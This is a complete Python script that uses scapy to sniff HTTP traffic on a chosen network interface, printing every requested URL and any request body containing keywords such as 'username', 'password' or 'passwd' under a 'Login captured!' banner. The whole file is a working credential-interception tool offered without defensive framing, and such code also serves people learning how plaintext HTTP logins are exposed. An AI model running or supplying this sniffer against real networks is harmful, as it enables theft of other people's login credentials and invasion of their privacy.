#!/usr/bin/env python

import argparse
import scapy.all as scapy
from scapy_http import http




def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help="The network interface that you want to use")
    options = parser.parse_args()
    if not options.interface:
        parser.error("[-] Please specify an interface. Use --help.")
    return options


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)
        keywords = ["username", "uname", "login", "password", "pass", "passwd", "pw", "="]
        for keyword in keywords:  # only print if the packet has something from the keywords list
            if keyword in load:
                return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("\033[1;35m[+] URL captured!: " + url.decode())
        login_info = get_login_info(packet)
        if login_info:
            print("\033[93m[+] Login captured!: " + login_info + "\033[0m")


options = get_arguments()

sniff(options.interface)

interface = options.interface
